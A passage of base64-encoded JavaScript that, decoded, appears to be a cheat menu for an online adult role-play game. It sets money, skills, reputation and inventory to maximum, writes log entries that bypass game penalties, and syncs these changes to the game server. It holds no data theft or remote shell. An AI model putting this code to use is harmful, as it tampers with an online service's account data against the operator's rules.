24xMik7CnNlbGVjdC5hcHBlbmRDaGlsZChvcHRpb241KTsKc2VsZWN0LmFwcGVuZENoaWxkKG9wdGlvbjYpOwpzZWxlY3QuYXBwZW5kQ2hpbGQob3B0aW9uNyk7CnNlbGVjdC5hcHBlbmRDaGlsZChvcHRpb244KTsKc2VsZWN0LmFwcGVuZENoaWxkKG9wdGlvbjkpOwpzZWxlY3QuYXBwZW5kQ2hpbGQob3B0aW9uMTApOwpzZWxlY3QuYXBwZW5kQ2hpbGQob3B0aW9uMTEpOwpzZWxlY3QuYXBwZW5kQ2hpbGQob3B0aW9uMTMpOwpzZWxlY3QuYXBwZW5kQ2hpbGQob3B0aW9uMTQpOwpzZWxlY3QuYXBwZW5kQ2hpbGQob3B0aW9uMTYpOwpzZWxlY3QuYXBwZW5kQ2hpbGQob3B0aW9uMTcpOwpzZWxlY3QuYXBwZW5kQ2hpbGQob3B0aW9uMTgpOwpzZWxlY3QuYXBwZW5kQ2hpbGQob3B0aW9uMTkpOwpzZWxlY3QuYXBwZW5kQ2hpbGQob3B0aW9uMTUpOwoKCgovLyBCdXR0b24gdG8gc2hvdyB0aGUgZHJvcGRvd24gbWVudQp2YXIgZHJvcGRvd25CdXR0b24gPSBjcmVhdGVCdXR0b24oIlBlcnNvbmFsaXNhdGlvbiIsIGZ1bmN0aW9uKCkgewogIHNlbGVjdC5zdHlsZS5kaXNwbGF5ID0gImJsb2NrIjsKfSk7Ci8vbWFrZSBidXR0b24gdGFrZSBubyBzcGFjZQpkcm9wZG93bkJ1dHRvbi5zdHlsZS5vcGFjaXR5ID0gIjAiOwpkcm9wZG93bkJ1dHRvbi5zdHlsZS5wb2ludGVyRXZlbnRzID0gIm5vbmUiOwpkcm9wZG93bkJ1dHRvbi5zdHlsZS5wb3NpdGlvbiA9ICJhYnNvbHV0ZSI7CmRyb3Bkb3duQnV0dG9uLnN0eWxlLnRvcCA9ICItOTk5OXB4IjsKZHJvcGRvd25CdXR0b24uc3R5bGUubGVmdCA9ICItOTk5OXB4IjsKc2VsZWN0LmFkZEV2ZW50TGlzdGVuZXIoImNsaWNrIiwgZnVuY3Rpb24oZXZlbnQpIHsKICBldmVudC5zdG9wUHJvcGFnYXRpb24oKTsgCn0pOwoKc2VsZWN0LmFkZEV2ZW50TGlzdGVuZXIoImNoYW5nZSIsIGZ1bmN0aW9uKCkgewogIHZhciBzZWxlY3RlZE9wdGlvbiA9IHNlbGVjdC5vcHRpb25zW3NlbGVjdC5zZWxlY3RlZEluZGV4XS52YWx1ZTsKICBpZiAoc2VsZWN0ZWRPcHRpb24gPT09ICJvcHQxIikgewogICAgamF2YXNjcmlwdDpQbGF5ZXIuTW9uZXkgPSA5OTk5OTk5CiAgICBzaG93VG9hc3RzY3BnKCk7CiAgICBldmVudC5zdG9wUHJvcGFnYXRpb24oKTsKICAgIGV2ZW50LnN0b3BQcm9wYWdhdGlvbigpOwogICAgZm9yY2VjbG9zZW1lbnUoKTsKICB9IGVsc2UgaWYgKHNlbGVjdGVkT3B0aW9uID09PSAib3B0MiIpIHsKICAgIGphdmFzY3JpcHQ6UGxheWVyLk1vbmV5ID0gcHJvbXB0KCJFbnRlciBDYXNoIEFtb3VudCIpOwogICAgc2hvd1RvYXN0c2NwZygpOwogICAgZm9yY2VjbG9zZW1lbnUoKTsKICB9IGVsc2UgaWYgKHNlbGVjdGVkT3B0aW9uID09PSAib3B0MyIpIHsKICAgIGphdmFzY3JpcHQ6U2tpbGxDaGFuZ2UoIkluZmlsdHJhdGlvbiIsIDEwKTsKICAgIFNraWxsQ2hhbmdlKCJTZWxmQm9uZGFnZSIsIDEwKTsKICAgIFNraWxsQ2hhbmdlKCJXaWxscG93ZXIiLCAxMCk7CiAgICBTa2lsbENoYW5nZSgiRXZhc2lvbiIsIDEwKTsKICAgIFNraWxsQ2hhbmdlKCJCb25kYWdlIiwgMTApOwogICAgU2tpbGxDaGFuZ2UoIkRyZXNzYWdlIiwgMTApOwogICAgU2tpbGxDaGFuZ2UoIkxvY2tQaWNraW5nIiwgMTApOwogICAgc2hvd1RvYXN0c2NwZygpOwogICAgZm9yY2VjbG9zZW1lbnUoKTsKICB9IGVsc2UgaWYgKHNlbGVjdGVkT3B0aW9uID09PSAib3B0NCIpIHsKICAgIGphdmFzY3JpcHQ6UmVwdXRhdGlvbkNoYW5nZSgiR2FtaW5nIiwgMTAwKTsKICAgIFJlcHV0YXRpb25DaGFuZ2UoIkdhbWJsaW5nIiwgMTAwKTsKICAgIFJlcHV0YXRpb25DaGFuZ2UoIkxBUlAiLCAxMDApOwogICAgUmVwdXRhdGlvbkNoYW5nZSgiTWFpZCIsIDEwMCk7CiAgICBSZXB1dGF0aW9uQ2hhbmdlKCJBQkRMIiwgMTAwKTsKICAgIFJlcHV0YXRpb25DaGFuZ2UoIk51cnNlIiwgMTAwKTsKICAgIHNob3dUb2FzdHNjcGcoKTsKICAgIGZvcmNlY2xvc2VtZW51KCk7CiAgfSBlbHNlIGlmIChzZWxlY3RlZE9wdGlvbiA9PT0gIm9wdDUiKSB7CiAgICBqYXZhc2NyaXB0OlNlcnZlclBsYXllclN5bmMKICAgIEFzc2V0RmVtYWxlM0RDRy5mb3JFYWNoKGdyb3VwPT5ncm91cC5Bc3NldC5mb3JFYWNoKGl0ZW09PkludmVudG9yeUFkZChQbGF5ZXIsIGl0ZW0uTmFtZSwgZ3JvdXAuR3JvdXApKSk7CiAgICBTZXJ2ZXJQbGF5ZXJJbnZlbnRvcnlTeW5jKCk7CiAgICBzaG93VG9hc3RzY3BnKCk7CiAgICBmb3JjZWNsb3NlbWVudSgpOwogIH0gZWxzZSBpZiAoc2VsZWN0ZWRPcHRpb24gPT09ICJvcHQ2IikgewogICAgamF2YXNjcmlwdDpJbnZlbnRvcnlSZW1vdmUoUGxheWVyLCAiSXRlbU5lY2siKTsKICAgIENoYXRSb29tQ2hhcmFjdGVySXRlbVVwZGF0ZShQbGF5ZXIsICJJdGVtTmVjayIpOwogICAgTG9nQWRkKCJSZWxlYXNlZENvbGxhciIsICJPd25lclJ1bGUiKTsgCiAgICBzaG93VG9hc3RzY3BnKCk7CiAgICBmb3JjZWNsb3NlbWVudSgpOwogIH0gZWxzZSBpZiAoc2VsZWN0ZWRPcHRpb24gPT09ICJvcHQ3IikgewogICAgamF2YXNjcmlwdDphbGVydCgnU3RhcnQgYSBMQVJQIHNlc3Npb24gJiBzZWxlY3QgY2xhc3MgYmVmb3JlIHJ1bm5pbmcnKTsKICAgIEdhbWVMQVJQTGV2ZWxQcm9ncmVzcygxMDApIAogICAgc2hvd1RvYXN0c2NwZygpOwogICAgZm9yY2VjbG9zZW1lbnUoKTsKICB9IGVsc2UgaWYgKHNlbGVjdGVkT3B0aW9uID09PSAib3B0OCIpIHsKICAgIGphdmFzY3JpcHQ6TG9nQWRkKCJFc2NhcGVkIiwgIkFzeWx1bSIsIEN1cnJlbnRUaW1lICsgOTk5OTk5OTk5KTsKICAgIHNob3dUb2FzdHNjcGcoKTsKICAgIGZvcmNlY2xvc2VtZW51KCk7CiAgfSBlbHNlIGlmIChzZWxlY3RlZE9wdGlvbiA9PT0gIm9wdDkiKSB7CiAgICBqYXZhc2NyaXB0OkxvZ0FkZCgiQ2x1YlNsYXZlIiwgIk1hbmFnZW1lbnQiLCBDdXJyZW50VGltZSArIDk5OTk5OTk5OSk7CiAgICBzaG93VG9hc3RzY3BnKCk7CiAgICBmb3JjZWNsb3NlbWVudSgpOwogIH0gZWxzZSBpZiAoc2VsZWN0ZWRPcHRpb24gPT09ICJvcHQxMCIpIHsKICAgIGphdmFzY3JpcHQ6TG9nQWRkKCJFc2NhcGVkIiwgIkFzeWx1bSIsIEN1cnJlbnRUaW1lKTsKICAgIExvZ0FkZCgiQ2x1YlNsYXZlIiwgIk1hbmFnZW1lbnQiLCBDdXJyZW50VGltZSk7CiAgICBMb2dBZGQoIkJsb2NrQ2hhbmdlIiwgIlJ1bGUiLCBDdXJyZW50VGltZSk7CiAgICBNYW5hZ2VtZW50SXNDbHViU2xhdmUgPSBmdW5jdGlvbigpIHsKICAgIHJldHVybiBmYWxzZQogICAgfQogICAgTWFuYWdlbWVudENsdWJTbGF2ZURpYWxvZyA9IGZ1bmN0aW9uKFBsYXllcikge30KICAgIE1hbmFnZW1lbnRGaW5pc2hDbHViU2xhdmUoKQogICAgc2hvd1RvYXN0c2NwZygpOwogICAgZm9yY2VjbG9zZW1lbnUoKTsKICB9IGVsc2UgaWYgKHNlbGVjdGVkT3B0aW9uID09PSAib3B0MTEiKSB7CiAgICBqYXZhc2NyaXB0OmFsZXJ0KCdTdGFydCBhIEdHVFMgc2Vzc2lvbiBiZWZvcmUgcnVubmluZywgcmVmcmVzaCB0byBzZWUgY2hhbmdlcycpOwogICAgUGxheWVyLkdhbWUuR0dUUy5MZXZlbCA9IHByb21wdCgiRW50ZXIgR0dUUyBMZXZlbCAoMS02KSIpOzsKICAgIFNlcnZlckFjY291bnRVcGRhdGUuUXVldWVEYXRhKHsKICAgIEdhbWU6IFBsYXllci5HYW1lCiAgICB9KTsKICAgIHNob3dUb2FzdHNjcGcoKTsKICAgIGZvcmNlY2xvc2VtZW51KCk7CiAgICAKICB9ZWxzZSBpZiAoc2VsZWN0ZWRPcHRpb24gPT09ICJvcHQxMiIpIHsKICAgIGphdmFzY3JpcHQ6RGlhbG9nU2V0UmVwdXRhdGlvbigiRG9taW5hbnQiLCBwcm9tcHQoIkVudGVyIFN1Yi9Eb20gUmVwICgtMTAwIHRvIDEwMCkiKSk7CiAgICBzaG93VG9hc3RzY3BnKCk7CiAgICBmb3JjZWNsb3NlbWVudSgpOwogIH1lbHNlIGlmIChzZWxlY3RlZE9wdGlvbiA9PT0gIm9wdDEzIikgewogICAgamF2YXNjcmlwdDpuYW1lID0gcHJvbXB0KCJFbnRlciBOaWNrbmFtZSIpOzsKICAgIFBsYXllci5OaWNrbmFtZSA9IG5hbWU7CiAgICBTZXJ2ZXJBY2NvdW50VXBkYXRlLlF1ZXVlRGF0YSh7IE5pY2tuYW1lOiBuYW1lIH0sIHRydWUpOyAgIAogICAgc2hvd1RvYXN0c2NwZygpOwogICAgZm9yY2VjbG9zZW1lbnUoKTsgIAogIH1lbHNlIGlmIChzZWxlY3RlZE9wdGlvbiA9PT0gIm9wdDE0IikgewogICAgamF2YXNjcmlwdDpBY3Rpdml0eVNldEFyb3VzYWwoUGxheWVyLCAxKTsKICAgIEFjdGl2aXR5T3JnYXNtUHJlcGFyZShQbGF5ZXIsIHRydWUpOwogICAgQWN0aXZpdHlPcmdhc21HYW1lUmVzaXN0Q291bnQgPSAxOwogICAgc2hvd1RvYXN0c2NwZygpOwogICAgZm9yY2VjbG9zZW1lbnUoKTsKICB9ZWxzZSBpZiAoc2VsZWN0ZWRPcHRpb24gPT09ICJvcHQxNSIpIHsKICAgIGphdmFzY3JpcHQ6d2luZG93Lm9wZW4oJ2h0dHBzOi8vZGlzY29yZC5nZy92M0pCanlTNG14JywgJ19ibGFuaycpOwogICAgc2hvd1RvYXN0c2NwZygpOwogICAgZm9yY2VjbG9zZW1lbnUoKTsKICB9ZWxzZSBpZiAoc2VsZWN0ZWRPcHRpb24gPT09ICJvcHQxNiIpIHsKICAgIGphdmFzY3JpcHQ6KGZ1bmN0aW9uKCkge2xldCBpbnB1dCA9IHByb21wdCgiTWFsZSAvIEZlbWFsZSAvIE1peGVkIik7CiAgICBsZXQgcGxhY2Vob2xkZXI7CiAgICAKICAgIGlmIChpbnB1dC50b0xvd2VyQ2FzZSgpID09PSAibWFsZSIpIHsKICAgICAgcGxhY2Vob2xkZXIgPSAiTSI7CiAgICB9IGVsc2UgaWYgKGlucHV0LnRvTG93ZXJDYXNlKCkgPT09ICJtaXhlZCIpIHsKICAgICAgcGxhY2Vob2xkZXIgPSAiWCI7CiAgICB9IGVsc2UgewogICAgICBwbGFjZWhvbGRlciA9ICIiOwogICAgfSAgCgogICAgCiAgICBDaGF0Um9vbVN0YXJ0KHBsYWNlaG9sZGVyLCAiIiwgbnVsbCwgbnVsbCwgIkludHJvZHVjdGlvbiIsIEJhY2tncm91bmRzVGFnTGlzdCk7CiAgfSkoKTsKICAgIHNob3dUb2FzdHNjcGcoKTsKICAgIGZvcmNlY2xvc2VtZW51KCk7CiAgfWVsc2UgaWYgKHNlbGVjdGVkT3B0aW9uID09PSAib3B0MTciKSB7CiAgICBqYXZhc2NyaXB0OihmdW5jdGlvbigpIHtsZXQgaW5wdXQgPSBwcm9tcHQoIlN0YXJ0IGEgTEFSUCBSb29tIGFzIEFkbWluIEZpcnN0XG5TdGFydCAvIFNraXAgLyBNaXhlZCAvIFNodWZmbGUgLyBUZWFtIC8gV2luIChjb2xvcikiKS50b0xvd2VyQ2FzZSgpOwoKICAgIGlmIChpbnB1dCA9PT0gInN0YXJ0IikgewogICAgICBTZXJ2ZXJTZW5kKCJDaGF0Um9vbUdhbWUiLCB7IEdhbWVQcm9ncmVzczogIlN0YXJ0IiB9KTsKICAgIH0gZWxzZSBpZiAoaW5wdXQgPT09ICJza2lwIikgewogICAgICBTZXJ2ZXJTZW5kKCJDaGF0Um9vbUdhbWUiLCB7IEdhbWVQcm9ncmVzczogIlNraXAiIH0pOwogICAgfSBlbHNlIGlmIChpbnB1dCA9PT0gInNodWZmbGUiKSB7CiAgICAgIFNlcnZlclNlbmQoIkNoYXRSb29tQWRtaW4iLCB7IE1lbWJlck51bWJlcjogQ2hhdFJvb21DaGFyYWN0ZXJbMV0uTWVtYmVyTnVtYmVyLCBBY3Rpb246ICJTaHVmZmxlIiB9KTsKICAgIH0gZWxzZSBpZiAoaW5wdXQgPT09ICJ0ZWFtIikgewogICAgICBjb25zdCBEaWN0aW9uYXJ5ID0gbmV3IERpY3Rpb25hcnlCdWlsZGVyKCkKICAgICAgLnNvdXJjZUNoYXJhY3RlcihQbGF5ZXIpCiAgICAgIC5idWlsZCgpOwogICAgU2VydmVyU2VuZCgiQ2hhdFJvb21DaGF0IiwgeyBDb250ZW50OiAiTEFSUENoYW5nZVRlYW1DbGFzcyIsIFR5cGU6ICJBY3Rpb24iLCBEaWN0aW9uYXJ5OiBEaWN0aW9uYXJ5IH0pOwogIH0gZWxzZSBpZiAoaW5wdXQuc3RhcnRzV2l0aCgid2luIikpIHsKICAgICAgbGV0IGNvbG9yID0gaW5wdXQuc2xpY2UoNCkudHJpbSgpOwogICAgICBjb2xvciA9IGNvbG9yLmNoYXJBdCgwKS50b1VwcGVyQ2FzZSgpICsgY29sb3Iuc2xpY2UoMSk7CiAgICAgIEdhbWVMQVJQQWRkQ2hhdExvZygiRW5kR2FtZSIsIFBsYXllciwgUGxheWVyLCBPbmxpbmVHYW1lRGljdGlvbmFyeVRleHQoIlRlYW0iICsgY29sb3IpLCAwLCAwLCAiIzAwMDBCMCIpOwogICAgfQogIH0pKCk7CgogICAgc2hvd1RvYXN0c2NwZygpOwogICAgZm9yY2VjbG9zZW1lbnUoKTsKICB9ZWxzZSBpZiAoc2VsZWN0ZWRPcHRpb24gPT09ICJvcHQxOCIpIHsKICBkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGJ1dHRvbkNvbnRhaW5lcik7CiAgYnV0dG9uQ29udGFpbmVyLnN0eWxlLmRpc3BsYXkgPSAiYmxvY2siOwogIH1lbHNlIGlmIChzZWxlY3RlZE9wdGlvbiA9PT0gIm9wdDE5IikgewogICAgZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChzZXR0aW5nc01lbnUpOwogICAgc2V0dGluZ3NNZW51LnN0eWxlLmRpc3BsYXkgPSAiYmxvY2siOwogICAgc2hvd1RvYXN0c2NwZygpOwogICAgZm9yY2VjbG9zZW1lbnUoKTsKICB9CiAgCgogIC8vIEhpZGUgZGQgbWVudQogIHNlbGVjdC5zdHlsZS5kaXNwbGF5ID0gIm5vbmUiOwp9KTsKCi8vRW5kIG9mIEREIG1lbnVfX19fX19fX19fX19fX19fX19fX19fX19fX19fXwoKCmZ1bmN0aW9uIHVwZGF0ZUNvbnRleHRNZW51KCkgewogIHdoaWxlIChjb250ZXh0TWVudS5maXJzdENoaWxkKSB7CiAgICBjb250ZXh0TWVudS5yZW1vdmVDaGlsZChjb250ZXh0TWVudS5maXJzdENoaWxkKTsKICB9CiAgY29udGV4dE1lbnUuYXBwZW5kQ2hpbGQoaGVhZGVyKTsKICBjb250ZXh0TWVudS5hcHBlbmRDaGlsZChjcmVhdGVTZXBhcmF0b3IoKSk7CiAgY29udGV4dE1lbnUuYXBwZW5kQ2hpbGQoYnV0dG9uMSk7CiAgY29udGV4dE1lbnUuYXBwZW5kQ2hpbGQoYnV0dG9uMik7CiAgY29udGV4dE1lbnUuYXBwZW5kQ2hpbGQoYnV0dG9uMyk7CiAgY29udGV4dE1lbnUuYXBwZW5kQ2hpbGQoYnV0dG9uNCk7CiAgY29udGV4dE1lbnUuYXBwZW5kQ2hpbGQoYnV0dG9uNSk7CiAgY29udGV4dE1lbnUuYXBwZW5kQ2hpbGQoYnV0dG9uNik7CiAgY29udGV4dE1lbnUuYXBwZW5kQ2hpbGQoYnV0dG9uNyk7CiAgaWYgKHZpc2IpIHsKICAgIGNvbnRleHRNZW51LmFwcGVuZENoaWxkKGJ1dHRvbjgpOwogIH0gZWxzZSB7CiAgICBjb250ZXh0TWVudS5hcHBlbmRDaGlsZChidXR0b245KTsKICB9CiAgY29udGV4dE1lbnUuYXBwZW5kQ2hpbGQoYnV0dG9uMTApOwogIC8vIEFkZCB0aGUgZGQgbWVudSB0byB0aGUgY29udGV4dCBtZW51CiAgY29udGV4dE1lbnUuYXBwZW5kQ2hpbGQoY3JlYXRlU2VwYXJhdG9yKCkpOwogIGNvbnRleHRNZW51LmFwcGVuZENoaWxkKGRyb3Bkb3duQnV0dG9uKTsKICBjb250ZXh0TWVudS5hcHBlbmRDaGlsZChzZWxlY3QpOwogIAp9CnVwZGF0ZUNvbnRleHRNZW51KCk7Ci8vIEV2ZW50IGxpc3RlbmVyIHRvIHVwZGF0ZSB0aGUgbWVudSB3aGVuIG9wZW5lZApjb250ZXh0TWVudS5hZGRFdmVudExpc3RlbmVyKCdjb250ZXh0bWVudScsIGZ1bmN0aW9uKCkgewogIHVwZGF0ZUNvbnRleHRNZW51KCk7Cn0pOwpkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGNvbnRleHRNZW51KTsKfSk7CgovLyBIaWRlIHRoZSBjdXN0b20gY29udGV4dCBtZW51CmRvY3VtZW50LmFkZEV2ZW50TGlzdGVuZXIoImNsaWNrIiwgZnVuY3Rpb24oKSB7CiAgICBpZiAoY29udGV4dE1lbnVPcGVuKSB7CiAgICAgICAgdmFyIGNvbnRleHRNZW51ID0gZG9jdW1lbnQucXVlcnlTZWxlY3RvcigiZGl2W3N0eWxlKj0nZml4ZWQnXSIpOwogICAgICAgIGlmIChjb250ZXh0TWVudSkgewogICAgICAgICAgICBjb250ZXh0TWVudS5zdHlsZS5kaXNwbGF5ID0gIm5vbmUiOwogICAgICAgICAgICBDaGF0Um9vbUNsaWNrQ2hhcmFjdGVyKFBsYXllcik7CiAgICAgICAgICAgIERpYWxvZ0xlYXZlKCk7CiAgICAgICAgfQogICAgICAgIGNvbnRleHRNZW51T3BlbiA9IGZhbHNlOwogICAgfQp9KTsKCgovL1N0YXJ0IG9mIGtleWJvYXJkIHNob3J0Y3V0c19fX19fX19fX19fX19fX19fX18KCmxldCBiYWNrdGlja1ByZXNzZWQgPSBmYWxzZTsKbGV0IGxhc3RLZXlQcmVzc2VkID0gbnVsbDsKCmRvY3VtZW50LmFkZEV2ZW50TGlzdGVuZXIoImtleWRvd24iLCBmdW5jdGlvbihldmVudCkgewogIGlmIChldmVudC5rZXkgPT09ICJgIiAmJiAhYmFja3RpY2tQcmVzc2VkKSB7CiAgICBiYWNrdGlja1ByZXNzZWQgPSB0cnVlOwogIH0KICBlbHNlIGlmIChiYWNrdGlja1ByZXNzZWQpIHsKICAgIGxhc3RLZXlQcmVzc2VkID0gZXZlbnQua2V5OwogIH0KfSk7Cgpkb2N1bWVudC5hZGRFdmVudExpc3RlbmVyKCJrZXl1cCIsIGZ1bmN0aW9uKGV2ZW50KSB7CiAgaWYgKGV2ZW50LmtleSA9PT0gImAiKSB7CiAgICBiYWNrdGlja1ByZXNzZWQgPSBmYWxzZTsKICAgIGxhc3RLZXlQcmVzc2VkID0gbnVsbDsKICB9Cn0pOwoKc2V0SW50ZXJ2YWwoZnVuY3Rpb24oKSB7CiAgaWYgKGxhc3RLZXlQcmVzc2VkID09PSAiLCIgfHwgbGFzdEtleVByZXNzZWQgPT09ICIuIikgewogICAgbGV0IGFjdGlvbiA9IGxhc3RLZXlQcmVzc2VkID09PSAiLCIgPyAiTW92ZUxlZnQiIDogIk1vdmVSaWdodCI7CiAgICBTZXJ2ZXJTZW5kKCJDaGF0Um9vbUFkbWluIiwgewogICAgICBNZW1iZXJOdW1iZXI6IFBsYXllci5NZW1iZXJOdW1iZXIsCiAgICAgIEFjdGlvbjogYWN0aW9uLAogICAgfSk7CiAgfQp9LCA1MCk7Ci8vU3RhcnQgb2YgUGVyc2lzdGFudCBNZW51IF9fX19fX19fX19fX19fX19fX19fXwoKY29uc3Qgc2V0dGluZ3NNZW51ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiZGl2Iik7CnNldHRpbmdzTWVudS5pZCA9ICJzZXR0aW5ncy1tZW51IjsKc2V0dGluZ3NNZW51LnN0eWxlLnBvc2l0aW9uID0gImZpeGVkIjsKc2V0dGluZ3NNZW51LnN0eWxlLnRvcCA9ICIyMHB4IjsKc2V0dGluZ3NNZW51LnN0eWxlLmxlZnQgPSAiMjBweCI7CnNldHRpbmdzTWVudS5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAiI2ZmZiI7CnNldHRpbmdzTWVudS5zdHlsZS5ib3JkZXIgPSAiMXB4IHNvbGlkICNjY2MiOwpzZXR0aW5nc01lbnUuc3R5bGUucGFkZGluZyA9ICIzcHgiOwpzZXR0aW5nc01lbnUuc3R5bGUuYm9yZGVyUmFkaXVzID0gIjEwcHgiOwpzZXR0aW5nc01lbnUuc3R5bGUuZGlzcGxheSA9ICJub25lIjsKc2V0dGluZ3NNZW51LnN0eWxlLnpJbmRleCA9ICI5OTk5IjsKCi8vQkNNIGxvZ28gICAKY29uc3QgQkNNRWxvZ28xID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiaW1nIik7CkJDTUVsb2dvMS5zcmMgPSAiaHR0cHM6Ly9tZWRpYS5kaXNjb3JkYXBwLm5ldC9hdHRhY2htZW50cy83ODE3NDkyMjkzMzE5MzkzMjgvMTA3OTY1OTAxNjkxOTE5NTc0OC9iNjY0MTkxMTc4OTdhOTg4LnBuZz93aWR0aD0xMTkwJmhlaWdodD0xMTg5IjsKQkNNRWxvZ28xLnN0eWxlLmZsb2F0ID0gImxlZnQiOwpCQ01FbG9nbzEuc3R5bGUubWFyZ2luUmlnaHQgPSAiMTBweCI7CkJDTUVsb2dvMS5zdHlsZS53aWR0aCA9ICI0MHB4IjsgCkJDTUVsb2dvMS5zdHlsZS5oZWlnaHQgPSAiNDBweCI7IApzZXR0aW5nc01lbnUuYXBwZW5kQ2hpbGQoQkNNRWxvZ28xKTsKCi8vT3B0aW9ucyBhbmQgc3R5bGVfX19fX19fX19fX19fX19fX19fX19fX19fX19fXwoKY29uc3Qgb3B0aW9uMSA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImxhYmVsIik7Cm9wdGlvbjEudGV4dENvbnRlbnQgPSAiQW50aWJsaW5kIjsKY29uc3QgY2hlY2tib3gxID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiaW5wdXQiKTsKY2hlY2tib3gxLnR5cGUgPSAiY2hlY2tib3giOwpjaGVja2JveDEuaWQgPSAib3B0aW9uMSI7CmNoZWNrYm94MS5zdHlsZS5tYXJnaW5SaWdodCA9ICI1cHgiOwpjaGVja2JveDEuc3R5bGUudmVydGljYWxBbGlnbiA9ICJtaWRkbGUiOwpvcHRpb24xLmFwcGVuZENoaWxkKGNoZWNrYm94MSk7CnNldHRpbmdzTWVudS5hcHBlbmRDaGlsZChvcHRpb24xKTsKCmNvbnN0IG9wdGlvbjIgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJsYWJlbCIpOwpvcHRpb24yLnRleHRDb250ZW50ID0gIlJlYWxpc3RpYyBUYWxraW5nIjsKY29uc3QgY2hlY2tib3gyID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiaW5wdXQiKTsKY2hlY2tib3gyLnR5cGUgPSAiY2hlY2tib3giOwpjaGVja2JveDIuaWQgPSAib3B0aW9uMiI7CmNoZWNrYm94Mi5zdHlsZS5tYXJnaW5SaWdodCA9ICI1cHgiOwpjaGVja2JveDIuc3R5bGUudmVydGljYWxBbGlnbiA9ICJtaWRkbGUiOwpvcHRpb24yLmFwcGVuZENoaWxkKGNoZWNrYm94Mik7CnNldHRpbmdzTWVudS5hcHBlbmRDaGlsZChvcHRpb24yKTsKCmNvbnN0IG9wdGlvbjMgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJsYWJlbCIpOwpvcHRpb24zLnRleHRDb250ZW50ID0gIlNvdW5kIjsKY29uc3QgY2hlY2tib3gzID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiaW5wdXQiKTsKY2hlY2tib3gzLnR5cGUgPSAiY2hlY2tib3giOwpjaGVja2JveDMuaWQgPSAib3B0aW9uMyI7CmNoZWNrYm94My5zdHlsZS5tYXJnaW5SaWdodCA9ICI1cHgiOwpjaGVja2JveDMuc3R5bGUudmVydGljYWxBbGlnbiA9ICJtaWRkbGUiOwpvcHRpb24zLmFwcGVuZENoaWxkKGNoZWNrYm94Myk7CnNldHRpbmdzTWVudS5hcHBlbmRDaGlsZChvcHRpb24zKTsKCm9wdGlvbjEuc3R5bGUuZGlzcGxheSA9ICJmbGV4IjsKb3B0aW9uMS5zdHlsZS5qdXN0aWZ5Q29udGVudCA9ICJjZW50ZXIiOwpvcHRpb24xLnN0eWxlLmFsaWduSXRlbXMgPSAiY2VudGVyIjsKb3B0aW9uMS5zdHlsZS5tYXJnaW5Cb3R0b20gPSAiMTBweCI7Cm9wdGlvbjEuc3R5bGUucGFkZGluZyA9ICI1cHgiOwpvcHRpb24xLnN0eWxlLmJvcmRlclJhZGl1cyA9ICI1cHgiOwpvcHRpb24xLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICIjZjJmMmYyIjsKCm9wdGlvbjIuc3R5bGUuZGlzcGxheSA9ICJmbGV4IjsKb3B0aW9uMi5zdHlsZS5qdXN0aWZ5Q29udGVudCA9ICJjZW50ZXIiOwpvcHRpb24yLnN0eWxlLmFsaWduSXRlbXMgPSAiY2VudGVyIjsKb3B0aW9uMi5zdHlsZS5tYXJnaW5Cb3R0b20gPSAiMTBweCI7Cm9wdGlvbjIuc3R5bGUucGFkZGluZyA9ICI1cHgiOwpvcHRpb24yLnN0eWxlLmJvcmRlclJhZGl1cyA9ICI1cHgiOwpvcHRpb24yLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICIjZjJmMmYyIjsKCm9wdGlvbjMuc3R5bGUuZGlzcGxheSA9ICJmbGV4IjsKb3B0aW9uMy5zdHlsZS5qdXN0aWZ5Q29udGVudCA9ICJjZW50ZXIiOwpvcHRpb24zLnN0eWxlLmFsaWduSXRlbXMgPSAiY2VudGVyIjsKb3B0aW9uMy5zdHlsZS5tYXJnaW5Cb3R0b20gPSAiMTBweCI7Cm9wdGlvbjMuc3R5bGUucGFkZGluZyA9ICI1cHgiOwpvcHRpb24zLnN0eWxlLmJvcmRlclJhZGl1cyA9ICI1cHgiOwpvcHRpb24zLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICIjZjJmMmYyIjsKCm9wdGlvbjEuYWRkRXZlbnRMaXN0ZW5lcigibW91c2VlbnRlciIsIGZ1bmN0aW9uKCkgewogIG9wdGlvbjEuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gIiNkZGQiOwogIG9wdGlvbjEuc3R5bGUuY3Vyc29yID0gInBvaW50ZXIiOwp9KTsKCm9wdGlvbjEuYWRkRXZlbnRMaXN0ZW5lcigibW91c2VsZWF2ZSIsIGZ1bmN0aW9uKCkgewogIGlmIChjaGVja2JveDEuY2hlY2tlZCkgewogICAgb3B0aW9uMS5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAibGlnaHRncmVlbiI7CiAgfSBlbHNlIHsKICAgIG9wdGlvbjEuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gIiNmMmYyZjIiOwogIH0KfSk7CgpvcHRpb24yLmFkZEV2ZW50TGlzdGVuZXIoIm1vdXNlZW50ZXIiLCBmdW5jdGlvbigpIHsKICBvcHRpb24yLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICIjZGRkIjsKICBvcHRpb24yLnN0eWxlLmN1cnNvciA9ICJwb2ludGVyIjsKfSk7CgpvcHRpb24yLmFkZEV2ZW50TGlzdGVuZXIoIm1vdXNlbGVhdmUiLCBmdW5jdGlvbigpIHsKICBpZiAoY2hlY2tib3gyLmNoZWNrZWQpIHsKICAgIG9wdGlvbjIuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gImxpZ2h0Z3JlZW4iOwogIH0gZWxzZSB7CiAgICBvcHRpb24yLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICIjZjJmMmYyIjsKICB9Cn0pOwoKb3B0aW9uMy5hZGRFdmVudExpc3RlbmVyKCJtb3VzZWVudGVyIiwgZnVuY3Rpb24oKSB7CiAgb3B0aW9uMy5zdHlsZS5iYWNr